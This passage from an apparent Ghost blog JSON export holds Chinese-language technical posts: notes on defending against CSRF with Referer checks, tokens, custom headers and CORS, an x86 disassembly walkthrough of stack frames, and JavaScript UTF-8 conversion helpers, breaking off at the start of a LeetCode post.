Referer\n根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问\nhttp://bank.test/test?page=10&userID=101&money=10000\n页面完成，用户必须先登录，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank.\ntest开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。\n\n4.2使用Token\nCSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中。因此，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，对于token错误的请求，则认为是CSRF攻击，并拒绝该请求。\n\n4.3在HTTP头中自定义属性并验证\n自定义HTTP头X-CSRF-Token。先把token放入meta：\n\n然后在全局Ajax中使用这种方式设置X-CSRF-Token请求头并提交：\n$.ajaxSetup({\nheaders: {\n'X-CSRF-TOKEN': $('meta[name=\"csrf-token\"]').attr('content')\n}\n});\n每次Ajax请求则会自动加上自定义的HTTP头X-CSRF-Token。\n######4.4 安全的跨域请求\n使用新的W3C标准CORS，全称是\"跨域资源共享\"（Cross-origin resource sharing）。\n下面是一个例子，浏览器发现这次跨源AJAX请求是一般请求，就自动在头信息之中，添加一个Origin字段。如下GET /cors HTTP/1.1\nOrigin: http://api.bob.com\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0\n上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 +\n端口）。服务器根据这个值，决定是否同意这次请求。如果在B站请求A站浏览器会不允许跨域获取数据。如果在A站返回的数据加上一个Access-Control-Allow-Origin:*的HTTP的头。这所有网站都能访问。但是，这并不是我们想要的，只需把Access-Control-Allow-Origin修改成需要给权限的网站即可。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-02-14T04:42:39.000Z","created_by":"1","updated_at":"2017-02-18T05:48:22.000Z","updated_by":"1","published_at":"2017-01-14T04:43:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d312","uuid":"ddd08849-0f41-4275-a79c-67aa978e0ec0","title":"esp,ebp汇编关于堆栈调用,局部变量","slug":"esp-ebphui-bian-guan-yu-dui-zhan-diao-yong-ju-bu-bian-liang","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"c语言如下\\n```\\nint fn(int x,int y,int z) {\\n\\tint a = 3;\\n\\tint b = 4;\\n\\treturn x + y+z+a+b;\\n}\\n\\nint main()\\n{\\n\\tprintf(\\\"%d\\\", fn(1, 2, 5)); //csasdfas\\n\\tgetchar();\\n    return 0;\\n}\\n\\n```\\n> 对应的反汇编代码\\n\\nmain函数\\n```\\n00AF182E    6A 05           push 0x5\\n00AF1830    6A 02           push 0x2\\n00AF1832    6A 01           push 0x1\\n00AF1834    E8 16F9FFFF     call ConsoleA.00AF114F\\n```\\nfn函数\\n```https://www.dadigua.win/ghost/settings/code-injection/\\n00AF16F0 >  55              push ebp\\n00AF16F1    8BEC            mov ebp,esp\\n00AF16F3    81EC D8000000   sub esp,0xD8\\n00AF16F9    53              push ebx\\n00AF16FA    56              push esi                                 ; ConsoleA.<ModuleEntryPoint>\\n00AF16FB    57              push edi\\n00AF16FC    8DBD 28FFFFFF   lea edi,dword ptr ss:[ebp-0xD8]\\n00AF1702    B9 36000000     mov ecx,0x36\\n00AF1707    B8 CCCCCCCC     mov eax,0xCCCCCCCC\\n00AF170C    F3:AB           rep stos dword ptr es:[edi]\\n00AF170E    C745 F8 0300000>mov dword ptr ss:[ebp-0x8],0x3\\n00AF1715    C745 EC 0400000>mov dword ptr ss:[ebp-0x14],0x4\\n00AF171C    8B45 08         mov eax,dword ptr ss:[ebp+0x8]\\n00AF171F    0345 0C         add eax,dword ptr ss:[ebp+0xC]\\n00AF1722    0345 10         add eax,dword ptr ss:[ebp+0x10]\\n00AF1725    0345 F8         add eax,dword ptr ss:[ebp-0x8]\\n00AF1728    0345 EC         add eax,dword ptr ss:[ebp-0x14]\\n00AF172B    5F              pop edi\\n00AF172C    5E              pop esi                                  ; ConsoleA.<ModuleEntryPoint>\\n00AF172D    5B              pop ebx\\n00AF172E    8BE5            mov esp,ebp\\n00AF1730 >  5D              pop ebp\\n00AF1731    C3              retn\\n```\\nmain函数中call fn(1,2,5),先把参数入栈,call把当前地址入栈，跳转到fn函数。然后保存EBP，再把当前ESP值赋给EBP，相当于这个函数所用的堆栈空间的起点，sub esp,0xD8定义局部空间的大小。保存ebx，esi，edi的值（入栈）。初始化局部空间。\\n![](/content/images/2017/02/2012081414392956.gif)\\n如图，\\n```\\nmov dword ptr ss:[ebp-0x8],0x3    [ebp-0x8]就是局部变量a赋值3\\nmov dword ptr ss:[ebp-0x14],0x4   [ebp-0x14]就是局部变量b赋值4\\nmov eax,dword ptr ss:[ebp+0x8]    [ebp+0x8] 参数x=1\\nadd eax,dword ptr ss:[ebp+0xC]    [ebp+0xC] 参数y=2\\nadd eax,dword ptr ss:[ebp+0x10]   [ebp+0x10] 参数z=5\\n```\\n\\n注意：win32汇编写的函数返回值一般在eax中,返回64位的数的话，EDX存放的是高32位，EAX存低32位.\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>c语言如下</p>\n<pre><code>int fn(int x,int y,int z) {\n\tint a = 3;\n\tint b = 4;\n\treturn x + y+z+a+b;\n}\n\nint main()\n{\n\tprintf(&quot;%d&quot;, fn(1, 2, 5)); //csasdfas\n\tgetchar();\n    return 0;\n}\n\n</code></pre>\n<blockquote>\n<p>对应的反汇编代码</p>\n</blockquote>\n<p>main函数</p>\n<pre><code>00AF182E    6A 05           push 0x5\n00AF1830    6A 02           push 0x2\n00AF1832    6A 01           push 0x1\n00AF1834    E8 16F9FFFF     call ConsoleA.00AF114F\n</code></pre>\n<p>fn函数</p>\n<pre><code class=\"language-https://www.dadigua.win/ghost/settings/code-injection/\">00AF16F0 &gt;  55              push ebp\n00AF16F1    8BEC            mov ebp,esp\n00AF16F3    81EC D8000000   sub esp,0xD8\n00AF16F9    53              push ebx\n00AF16FA    56              push esi                                 ; ConsoleA.&lt;ModuleEntryPoint&gt;\n00AF16FB    57              push edi\n00AF16FC    8DBD 28FFFFFF   lea edi,dword ptr ss:[ebp-0xD8]\n00AF1702    B9 36000000     mov ecx,0x36\n00AF1707    B8 CCCCCCCC     mov eax,0xCCCCCCCC\n00AF170C    F3:AB           rep stos dword ptr es:[edi]\n00AF170E    C745 F8 0300000&gt;mov dword ptr ss:[ebp-0x8],0x3\n00AF1715    C745 EC 0400000&gt;mov dword ptr ss:[ebp-0x14],0x4\n00AF171C    8B45 08         mov eax,dword ptr ss:[ebp+0x8]\n00AF171F    0345 0C         add eax,dword ptr ss:[ebp+0xC]\n00AF1722    0345 10         add eax,dword ptr ss:[ebp+0x10]\n00AF1725    0345 F8         add eax,dword ptr ss:[ebp-0x8]\n00AF1728    0345 EC         add eax,dword ptr ss:[ebp-0x14]\n00AF172B    5F              pop edi\n00AF172C    5E              pop esi                                  ; ConsoleA.&lt;ModuleEntryPoint&gt;\n00AF172D    5B              pop ebx\n00AF172E    8BE5            mov esp,ebp\n00AF1730 &gt;  5D              pop ebp\n00AF1731    C3              retn\n</code></pre>\n<p>main函数中call fn(1,2,5),先把参数入栈,call把当前地址入栈，跳转到fn函数。然后保存EBP，再把当前ESP值赋给EBP，相当于这个函数所用的堆栈空间的起点，sub esp,0xD8定义局部空间的大小。保存ebx，esi，edi的值（入栈）。初始化局部空间。<br>\n<img src=\"/content/images/2017/02/2012081414392956.gif\" alt=\"\"><br>\n如图，</p>\n<pre><code>mov dword ptr ss:[ebp-0x8],0x3    [ebp-0x8]就是局部变量a赋值3\nmov dword ptr ss:[ebp-0x14],0x4   [ebp-0x14]就是局部变量b赋值4\nmov eax,dword ptr ss:[ebp+0x8]    [ebp+0x8] 参数x=1\nadd eax,dword ptr ss:[ebp+0xC]    [ebp+0xC] 参数y=2\nadd eax,dword ptr ss:[ebp+0x10]   [ebp+0x10] 参数z=5\n</code></pre>\n<p>注意：win32汇编写的函数返回值一般在eax中,返回64位的数的话，EDX存放的是高32位，EAX存低32位.</p>\n<!--kg-card-end: markdown-->","comment_id":"85","plaintext":"c语言如下\n\nint fn(int x,int y,int z) {\n\tint a = 3;\n\tint b = 4;\n\treturn x + y+z+a+b;\n}\n\nint main()\n{\n\tprintf(\"%d\", fn(1, 2, 5)); //csasdfas\n\tgetchar();\n    return 0;\n}\n\n\n\n> 对应的反汇编代码\n\n\nmain函数\n\n00AF182E    6A 05           push 0x5\n00AF1830    6A 02           push 0x2\n00AF1832    6A 01           push 0x1\n00AF1834    E8 16F9FFFF     call ConsoleA.00AF114F\n\n\nfn函数\n\n00AF16F0 >  55              push ebp\n00AF16F1    8BEC            mov ebp,esp\n00AF16F3    81EC D8000000   sub esp,0xD8\n00AF16F9    53              push ebx\n00AF16FA    56              push esi                                 ; ConsoleA.<ModuleEntryPoint>\n00AF16FB    57              push edi\n00AF16FC    8DBD 28FFFFFF   lea edi,dword ptr ss:[ebp-0xD8]\n00AF1702    B9 36000000     mov ecx,0x36\n00AF1707    B8 CCCCCCCC     mov eax,0xCCCCCCCC\n00AF170C    F3:AB           rep stos dword ptr es:[edi]\n00AF170E    C745 F8 0300000>mov dword ptr ss:[ebp-0x8],0x3\n00AF1715    C745 EC 0400000>mov dword ptr ss:[ebp-0x14],0x4\n00AF171C    8B45 08         mov eax,dword ptr ss:[ebp+0x8]\n00AF171F    0345 0C         add eax,dword ptr ss:[ebp+0xC]\n00AF1722    0345 10         add eax,dword ptr ss:[ebp+0x10]\n00AF1725    0345 F8         add eax,dword ptr ss:[ebp-0x8]\n00AF1728    0345 EC         add eax,dword ptr ss:[ebp-0x14]\n00AF172B    5F              pop edi\n00AF172C    5E              pop esi                                  ; ConsoleA.<ModuleEntryPoint>\n00AF172D    5B              pop ebx\n00AF172E    8BE5            mov esp,ebp\n00AF1730 >  5D              pop ebp\n00AF1731    C3              retn\n\n\nmain函数中call\nfn(1,2,5),先把参数入栈,call把当前地址入栈，跳转到fn函数。然后保存EBP，再把当前ESP值赋给EBP，相当于这个函数所用的堆栈空间的起点，sub\nesp,0xD8定义局部空间的大小。保存ebx，esi，edi的值（入栈）。初始化局部空间。\n\n如图，\n\nmov dword ptr ss:[ebp-0x8],0x3    [ebp-0x8]就是局部变量a赋值3\nmov dword ptr ss:[ebp-0x14],0x4   [ebp-0x14]就是局部变量b赋值4\nmov eax,dword ptr ss:[ebp+0x8]    [ebp+0x8] 参数x=1\nadd eax,dword ptr ss:[ebp+0xC]    [ebp+0xC] 参数y=2\nadd eax,dword ptr ss:[ebp+0x10]   [ebp+0x10] 参数z=5\n\n\n注意：win32汇编写的函数返回值一般在eax中,返回64位的数的话，EDX存放的是高32位，EAX存低32位.","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-02-18T08:03:42.000Z","created_by":"1","updated_at":"2017-02-18T09:06:43.000Z","updated_by":"1","published_at":"2017-02-18T09:06:43.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d313","uuid":"37841d28-127c-4c30-b7ae-ac804fe768a1","title":"js笔记3","slug":"jsbi-ji-3","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\nfunction UTF8ArrayToString(u8Array, idx) {\\n  var u0, u1, u2, u3, u4, u5;\\n\\n  var str = '';\\n  while (1) {\\n    // For UTF8 byte structure, see http://en.wikipedia.org/wiki/UTF-8#Description and https://www.ietf.org/rfc/rfc2279.txt and https://tools.ietf.org/html/rfc3629\\n    u0 = u8Array[idx++];\\n    if (!u0) return str;\\n    if (!(u0 & 0x80)) { str += String.fromCharCode(u0); continue; }\\n    u1 = u8Array[idx++] & 63;\\n    if ((u0 & 0xE0) == 0xC0) { str += String.fromCharCode(((u0 & 31) << 6) | u1); continue; }\\n    u2 = u8Array[idx++] & 63;\\n    if ((u0 & 0xF0) == 0xE0) {\\n      u0 = ((u0 & 15) << 12) | (u1 << 6) | u2;\\n    } else {\\n      u3 = u8Array[idx++] & 63;\\n      if ((u0 & 0xF8) == 0xF0) {\\n        u0 = ((u0 & 7) << 18) | (u1 << 12) | (u2 << 6) | u3;\\n      } else {\\n        u4 = u8Array[idx++] & 63;\\n        if ((u0 & 0xFC) == 0xF8) {\\n          u0 = ((u0 & 3) << 24) | (u1 << 18) | (u2 << 12) | (u3 << 6) | u4;\\n        } else {\\n          u5 = u8Array[idx++] & 63;\\n          u0 = ((u0 & 1) << 30) | (u1 << 24) | (u2 << 18) | (u3 << 12) | (u4 << 6) | u5;\\n        }\\n      }\\n    }\\n    if (u0 < 0x10000) {\\n      str += String.fromCharCode(u0);\\n    } else {\\n      var ch = u0 - 0x10000;\\n      str += String.fromCharCode(0xD800 | (ch >> 10), 0xDC00 | (ch & 0x3FF));\\n    }\\n  }\\n}\\n```\\n```\\n\\nfunction stringToUTF8Array(str, outU8Array, outIdx, maxBytesToWrite) {\\n  if (!(maxBytesToWrite > 0)) // Parameter maxBytesToWrite is not optional. Negative values, 0, null, undefined and false each don't write out any bytes.\\n    return 0;\\n\\n  var startIdx = outIdx;\\n  var endIdx = outIdx + maxBytesToWrite - 1; // -1 for string null terminator.\\n  for (var i = 0; i < str.length; ++i) {\\n    // Gotcha: charCodeAt returns a 16-bit word that is a UTF-16 encoded code unit, not a Unicode code point of the character! So decode UTF16->UTF32->UTF8.\\n    // See http://unicode.org/faq/utf_bom.html#utf16-3\\n    // For UTF8 byte structure, see http://en.wikipedia.org/wiki/UTF-8#Description and https://www.ietf.org/rfc/rfc2279.txt and https://tools.ietf.org/html/rfc3629\\n    var u = str.charCodeAt(i); // possibly a lead surrogate\\n    if (u >= 0xD800 && u <= 0xDFFF) u = 0x10000 + ((u & 0x3FF) << 10) | (str.charCodeAt(++i) & 0x3FF);\\n    if (u <= 0x7F) {\\n      if (outIdx >= endIdx) break;\\n      outU8Array[outIdx++] = u;\\n    } else if (u <= 0x7FF) {\\n      if (outIdx + 1 >= endIdx) break;\\n      outU8Array[outIdx++] = 0xC0 | (u >> 6);\\n      outU8Array[outIdx++] = 0x80 | (u & 63);\\n    } else if (u <= 0xFFFF) {\\n      if (outIdx + 2 >= endIdx) break;\\n      outU8Array[outIdx++] = 0xE0 | (u >> 12);\\n      outU8Array[outIdx++] = 0x80 | ((u >> 6) & 63);\\n      outU8Array[outIdx++] = 0x80 | (u & 63);\\n    } else if (u <= 0x1FFFFF) {\\n      if (outIdx + 3 >= endIdx) break;\\n      outU8Array[outIdx++] = 0xF0 | (u >> 18);\\n      outU8Array[outIdx++] = 0x80 | ((u >> 12) & 63);\\n      outU8Array[outIdx++] = 0x80 | ((u >> 6) & 63);\\n      outU8Array[outIdx++] = 0x80 | (u & 63);\\n    } else if (u <= 0x3FFFFFF) {\\n      if (outIdx + 4 >= endIdx) break;\\n      outU8Array[outIdx++] = 0xF8 | (u >> 24);\\n      outU8Array[outIdx++] = 0x80 | ((u >> 18) & 63);\\n      outU8Array[outIdx++] = 0x80 | ((u >> 12) & 63);\\n      outU8Array[outIdx++] = 0x80 | ((u >> 6) & 63);\\n      outU8Array[outIdx++] = 0x80 | (u & 63);\\n    } else {\\n      if (outIdx + 5 >= endIdx) break;\\n      outU8Array[outIdx++] = 0xFC | (u >> 30);\\n      outU8Array[outIdx++] = 0x80 | ((u >> 24) & 63);\\n      outU8Array[outIdx++] = 0x80 | ((u >> 18) & 63);\\n      outU8Array[outIdx++] = 0x80 | ((u >> 12) & 63);\\n      outU8Array[outIdx++] = 0x80 | ((u >> 6) & 63);\\n      outU8Array[outIdx++] = 0x80 | (u & 63);\\n    }\\n  }\\n  // Null-terminate the pointer to the buffer.\\n  outU8Array[outIdx] = 0;\\n  return outIdx - startIdx;\\n}\\n```\\n```\\nfunction lengthBytesUTF8(str) {\\n  var len = 0;\\n  for (var i = 0; i < str.length; ++i) {\\n    // Gotcha: charCodeAt returns a 16-bit word that is a UTF-16 encoded code unit, not a Unicode code point of the character! So decode UTF16->UTF32->UTF8.\\n    // See http://unicode.org/faq/utf_bom.html#utf16-3\\n    var u = str.charCodeAt(i); // possibly a lead surrogate\\n    if (u >= 0xD800 && u <= 0xDFFF) u = 0x10000 + ((u & 0x3FF) << 10) | (str.charCodeAt(++i) & 0x3FF);\\n    if (u <= 0x7F) {\\n      ++len;\\n    } else if (u <= 0x7FF) {\\n      len += 2;\\n    } else if (u <= 0xFFFF) {\\n      len += 3;\\n    } else if (u <= 0x1FFFFF) {\\n      len += 4;\\n    } else if (u <= 0x3FFFFFF) {\\n      len += 5;\\n    } else {\\n      len += 6;\\n    }\\n  }\\n  return len;\\n}\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>function UTF8ArrayToString(u8Array, idx) {\n  var u0, u1, u2, u3, u4, u5;\n\n  var str = '';\n  while (1) {\n    // For UTF8 byte structure, see http://en.wikipedia.org/wiki/UTF-8#Description and https://www.ietf.org/rfc/rfc2279.txt and https://tools.ietf.org/html/rfc3629\n    u0 = u8Array[idx++];\n    if (!u0) return str;\n    if (!(u0 &amp; 0x80)) { str += String.fromCharCode(u0); continue; }\n    u1 = u8Array[idx++] &amp; 63;\n    if ((u0 &amp; 0xE0) == 0xC0) { str += String.fromCharCode(((u0 &amp; 31) &lt;&lt; 6) | u1); continue; }\n    u2 = u8Array[idx++] &amp; 63;\n    if ((u0 &amp; 0xF0) == 0xE0) {\n      u0 = ((u0 &amp; 15) &lt;&lt; 12) | (u1 &lt;&lt; 6) | u2;\n    } else {\n      u3 = u8Array[idx++] &amp; 63;\n      if ((u0 &amp; 0xF8) == 0xF0) {\n        u0 = ((u0 &amp; 7) &lt;&lt; 18) | (u1 &lt;&lt; 12) | (u2 &lt;&lt; 6) | u3;\n      } else {\n        u4 = u8Array[idx++] &amp; 63;\n        if ((u0 &amp; 0xFC) == 0xF8) {\n          u0 = ((u0 &amp; 3) &lt;&lt; 24) | (u1 &lt;&lt; 18) | (u2 &lt;&lt; 12) | (u3 &lt;&lt; 6) | u4;\n        } else {\n          u5 = u8Array[idx++] &amp; 63;\n          u0 = ((u0 &amp; 1) &lt;&lt; 30) | (u1 &lt;&lt; 24) | (u2 &lt;&lt; 18) | (u3 &lt;&lt; 12) | (u4 &lt;&lt; 6) | u5;\n        }\n      }\n    }\n    if (u0 &lt; 0x10000) {\n      str += String.fromCharCode(u0);\n    } else {\n      var ch = u0 - 0x10000;\n      str += String.fromCharCode(0xD800 | (ch &gt;&gt; 10), 0xDC00 | (ch &amp; 0x3FF));\n    }\n  }\n}\n</code></pre>\n<pre><code>\nfunction stringToUTF8Array(str, outU8Array, outIdx, maxBytesToWrite) {\n  if (!(maxBytesToWrite &gt; 0)) // Parameter maxBytesToWrite is not optional. Negative values, 0, null, undefined and false each don't write out any bytes.\n    return 0;\n\n  var startIdx = outIdx;\n  var endIdx = outIdx + maxBytesToWrite - 1; // -1 for string null terminator.\n  for (var i = 0; i &lt; str.length; ++i) {\n    // Gotcha: charCodeAt returns a 16-bit word that is a UTF-16 encoded code unit, not a Unicode code point of the character! So decode UTF16-&gt;UTF32-&gt;UTF8.\n    // See http://unicode.org/faq/utf_bom.html#utf16-3\n    // For UTF8 byte structure, see http://en.wikipedia.org/wiki/UTF-8#Description and https://www.ietf.org/rfc/rfc2279.txt and https://tools.ietf.org/html/rfc3629\n    var u = str.charCodeAt(i); // possibly a lead surrogate\n    if (u &gt;= 0xD800 &amp;&amp; u &lt;= 0xDFFF) u = 0x10000 + ((u &amp; 0x3FF) &lt;&lt; 10) | (str.charCodeAt(++i) &amp; 0x3FF);\n    if (u &lt;= 0x7F) {\n      if (outIdx &gt;= endIdx) break;\n      outU8Array[outIdx++] = u;\n    } else if (u &lt;= 0x7FF) {\n      if (outIdx + 1 &gt;= endIdx) break;\n      outU8Array[outIdx++] = 0xC0 | (u &gt;&gt; 6);\n      outU8Array[outIdx++] = 0x80 | (u &amp; 63);\n    } else if (u &lt;= 0xFFFF) {\n      if (outIdx + 2 &gt;= endIdx) break;\n      outU8Array[outIdx++] = 0xE0 | (u &gt;&gt; 12);\n      outU8Array[outIdx++] = 0x80 | ((u &gt;&gt; 6) &amp; 63);\n      outU8Array[outIdx++] = 0x80 | (u &amp; 63);\n    } else if (u &lt;= 0x1FFFFF) {\n      if (outIdx + 3 &gt;= endIdx) break;\n      outU8Array[outIdx++] = 0xF0 | (u &gt;&gt; 18);\n      outU8Array[outIdx++] = 0x80 | ((u &gt;&gt; 12) &amp; 63);\n      outU8Array[outIdx++] = 0x80 | ((u &gt;&gt; 6) &amp; 63);\n      outU8Array[outIdx++] = 0x80 | (u &amp; 63);\n    } else if (u &lt;= 0x3FFFFFF) {\n      if (outIdx + 4 &gt;= endIdx) break;\n      outU8Array[outIdx++] = 0xF8 | (u &gt;&gt; 24);\n      outU8Array[outIdx++] = 0x80 | ((u &gt;&gt; 18) &amp; 63);\n      outU8Array[outIdx++] = 0x80 | ((u &gt;&gt; 12) &amp; 63);\n      outU8Array[outIdx++] = 0x80 | ((u &gt;&gt; 6) &amp; 63);\n      outU8Array[outIdx++] = 0x80 | (u &amp; 63);\n    } else {\n      if (outIdx + 5 &gt;= endIdx) break;\n      outU8Array[outIdx++] = 0xFC | (u &gt;&gt; 30);\n      outU8Array[outIdx++] = 0x80 | ((u &gt;&gt; 24) &amp; 63);\n      outU8Array[outIdx++] = 0x80 | ((u &gt;&gt; 18) &amp; 63);\n      outU8Array[outIdx++] = 0x80 | ((u &gt;&gt; 12) &amp; 63);\n      outU8Array[outIdx++] = 0x80 | ((u &gt;&gt; 6) &amp; 63);\n      outU8Array[outIdx++] = 0x80 | (u &amp; 63);\n    }\n  }\n  // Null-terminate the pointer to the buffer.\n  outU8Array[outIdx] = 0;\n  return outIdx - startIdx;\n}\n</code></pre>\n<pre><code>function lengthBytesUTF8(str) {\n  var len = 0;\n  for (var i = 0; i &lt; str.length; ++i) {\n    // Gotcha: charCodeAt returns a 16-bit word that is a UTF-16 encoded code unit, not a Unicode code point of the character! So decode UTF16-&gt;UTF32-&gt;UTF8.\n    // See http://unicode.org/faq/utf_bom.html#utf16-3\n    var u = str.charCodeAt(i); // possibly a lead surrogate\n    if (u &gt;= 0xD800 &amp;&amp; u &lt;= 0xDFFF) u = 0x10000 + ((u &amp; 0x3FF) &lt;&lt; 10) | (str.charCodeAt(++i) &amp; 0x3FF);\n    if (u &lt;= 0x7F) {\n      ++len;\n    } else if (u &lt;= 0x7FF) {\n      len += 2;\n    } else if (u &lt;= 0xFFFF) {\n      len += 3;\n    } else if (u &lt;= 0x1FFFFF) {\n      len += 4;\n    } else if (u &lt;= 0x3FFFFFF) {\n      len += 5;\n    } else {\n      len += 6;\n    }\n  }\n  return len;\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"87","plaintext":"function UTF8ArrayToString(u8Array, idx) {\n  var u0, u1, u2, u3, u4, u5;\n\n  var str = '';\n  while (1) {\n    // For UTF8 byte structure, see http://en.wikipedia.org/wiki/UTF-8#Description and https://www.ietf.org/rfc/rfc2279.txt and https://tools.ietf.org/html/rfc3629\n    u0 = u8Array[idx++];\n    if (!u0) return str;\n    if (!(u0 & 0x80)) { str += String.fromCharCode(u0); continue; }\n    u1 = u8Array[idx++] & 63;\n    if ((u0 & 0xE0) == 0xC0) { str += String.fromCharCode(((u0 & 31) << 6) | u1); continue; }\n    u2 = u8Array[idx++] & 63;\n    if ((u0 & 0xF0) == 0xE0) {\n      u0 = ((u0 & 15) << 12) | (u1 << 6) | u2;\n    } else {\n      u3 = u8Array[idx++] & 63;\n      if ((u0 & 0xF8) == 0xF0) {\n        u0 = ((u0 & 7) << 18) | (u1 << 12) | (u2 << 6) | u3;\n      } else {\n        u4 = u8Array[idx++] & 63;\n        if ((u0 & 0xFC) == 0xF8) {\n          u0 = ((u0 & 3) << 24) | (u1 << 18) | (u2 << 12) | (u3 << 6) | u4;\n        } else {\n          u5 = u8Array[idx++] & 63;\n          u0 = ((u0 & 1) << 30) | (u1 << 24) | (u2 << 18) | (u3 << 12) | (u4 << 6) | u5;\n        }\n      }\n    }\n    if (u0 < 0x10000) {\n      str += String.fromCharCode(u0);\n    } else {\n      var ch = u0 - 0x10000;\n      str += String.fromCharCode(0xD800 | (ch >> 10), 0xDC00 | (ch & 0x3FF));\n    }\n  }\n}\n\n\n\nfunction stringToUTF8Array(str, outU8Array, outIdx, maxBytesToWrite) {\n  if (!(maxBytesToWrite > 0)) // Parameter maxBytesToWrite is not optional. Negative values, 0, null, undefined and false each don't write out any bytes.\n    return 0;\n\n  var startIdx = outIdx;\n  var endIdx = outIdx + maxBytesToWrite - 1; // -1 for string null terminator.\n  for (var i = 0; i < str.length; ++i) {\n    // Gotcha: charCodeAt returns a 16-bit word that is a UTF-16 encoded code unit, not a Unicode code point of the character! So decode UTF16->UTF32->UTF8.\n    // See http://unicode.org/faq/utf_bom.html#utf16-3\n    // For UTF8 byte structure, see http://en.wikipedia.org/wiki/UTF-8#Description and https://www.ietf.org/rfc/rfc2279.txt and https://tools.ietf.org/html/rfc3629\n    var u = str.charCodeAt(i); // possibly a lead surrogate\n    if (u >= 0xD800 && u <= 0xDFFF) u = 0x10000 + ((u & 0x3FF) << 10) | (str.charCodeAt(++i) & 0x3FF);\n    if (u <= 0x7F) {\n      if (outIdx >= endIdx) break;\n      outU8Array[outIdx++] = u;\n    } else if (u <= 0x7FF) {\n      if (outIdx + 1 >= endIdx) break;\n      outU8Array[outIdx++] = 0xC0 | (u >> 6);\n      outU8Array[outIdx++] = 0x80 | (u & 63);\n    } else if (u <= 0xFFFF) {\n      if (outIdx + 2 >= endIdx) break;\n      outU8Array[outIdx++] = 0xE0 | (u >> 12);\n      outU8Array[outIdx++] = 0x80 | ((u >> 6) & 63);\n      outU8Array[outIdx++] = 0x80 | (u & 63);\n    } else if (u <= 0x1FFFFF) {\n      if (outIdx + 3 >= endIdx) break;\n      outU8Array[outIdx++] = 0xF0 | (u >> 18);\n      outU8Array[outIdx++] = 0x80 | ((u >> 12) & 63);\n      outU8Array[outIdx++] = 0x80 | ((u >> 6) & 63);\n      outU8Array[outIdx++] = 0x80 | (u & 63);\n    } else if (u <= 0x3FFFFFF) {\n      if (outIdx + 4 >= endIdx) break;\n      outU8Array[outIdx++] = 0xF8 | (u >> 24);\n      outU8Array[outIdx++] = 0x80 | ((u >> 18) & 63);\n      outU8Array[outIdx++] = 0x80 | ((u >> 12) & 63);\n      outU8Array[outIdx++] = 0x80 | ((u >> 6) & 63);\n      outU8Array[outIdx++] = 0x80 | (u & 63);\n    } else {\n      if (outIdx + 5 >= endIdx) break;\n      outU8Array[outIdx++] = 0xFC | (u >> 30);\n      outU8Array[outIdx++] = 0x80 | ((u >> 24) & 63);\n      outU8Array[outIdx++] = 0x80 | ((u >> 18) & 63);\n      outU8Array[outIdx++] = 0x80 | ((u >> 12) & 63);\n      outU8Array[outIdx++] = 0x80 | ((u >> 6) & 63);\n      outU8Array[outIdx++] = 0x80 | (u & 63);\n    }\n  }\n  // Null-terminate the pointer to the buffer.\n  outU8Array[outIdx] = 0;\n  return outIdx - startIdx;\n}\n\n\nfunction lengthBytesUTF8(str) {\n  var len = 0;\n  for (var i = 0; i < str.length; ++i) {\n    // Gotcha: charCodeAt returns a 16-bit word that is a UTF-16 encoded code unit, not a Unicode code point of the character! So decode UTF16->UTF32->UTF8.\n    // See http://unicode.org/faq/utf_bom.html#utf16-3\n    var u = str.charCodeAt(i); // possibly a lead surrogate\n    if (u >= 0xD800 && u <= 0xDFFF) u = 0x10000 + ((u & 0x3FF) << 10) | (str.charCodeAt(++i) & 0x3FF);\n    if (u <= 0x7F) {\n      ++len;\n    } else if (u <= 0x7FF) {\n      len += 2;\n    } else if (u <= 0xFFFF) {\n      len += 3;\n    } else if (u <= 0x1FFFFF) {\n      len += 4;\n    } else if (u <= 0x3FFFFFF) {\n      len += 5;\n    } else {\n      len += 6;\n    }\n  }\n  return len;\n}","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-02-21T07:36:41.000Z","created_by":"1","updated_at":"2017-02-21T07:36:55.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d314","uuid":"f52036ff-9055-4fbb-bf19-c81073d306b2","title":"Validate Binary Search Tree -- LeetCode","slug":"validate-binary-search-tree-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\" 